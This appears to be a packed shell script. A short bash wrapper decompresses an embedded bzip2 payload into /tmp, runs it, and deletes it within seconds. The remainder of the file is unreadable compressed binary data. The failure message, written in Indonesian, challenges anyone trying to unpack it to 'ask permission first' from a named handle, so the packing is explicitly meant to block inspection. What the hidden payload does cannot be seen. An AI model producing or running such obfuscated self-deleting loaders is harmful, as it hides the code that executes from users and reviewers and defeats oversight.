#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY���  ���� }���oޮ����    P���gv���	I1M�Кf���M4ѓ@����&�4jOА=M=   �@�� D�6��	�C�����a z�  ��&������F�FL�a �$��#I�&�z���=M=FF� h���@4��α�f����?{V��>�(�8݅�ر)�&4��c�j��H˄�Qa(9����鯾�!��rzپR$��#�%��c�춸��NI�I܆F�l�0���T,�
�[*��H�e{3\e�]�Tt��oI���9+_�%�*�����cp���Ma"&�7T)M��n�;V.n*Ig4;Q4>+��/`��Y�En5�y��P֘��<�'^:�p{�/����� d<�k����v����1s��YejS0�g�j-��ļi�f������Ec����<m�X�$��0t�Hr���UA�!��[�bM���!%�����,01S+K�:[�^wʤ�z�qJP�x��L��S]˟�a�Z��%�Z�HNs꘸�&�0�i_5'�E�OJ�������Pa��쫆�	��YN�e.j͢�1�٤q1��W-���~�#l���&��E1��t��'4("m��ya���~,V��u��h+�q�Ì�{��ⷕTn�ȁ2�1����Is_p� c�\6�-��+ۖ�k���Z���^Tgcm�cD2��Ԧ�Y5lKј��. ����0��}zn�~��Zj�С7����4^h/Š�Ht�TP��g��1r�ae���gL]�}<���9���d2���5XQ�`�F�M�q��ʯ�i;4���'�|C��� ��a"�|�=�(H�!.�	Α3S����`���y2�|��Y"��.P����ᓙ����بE��Lh�3u�
:I�NՌ���Ҥ����k�g	z�fѪBM
�
�-�hWJdo����q�>zHC*< �Qi�,��I��Z�V/���)��/��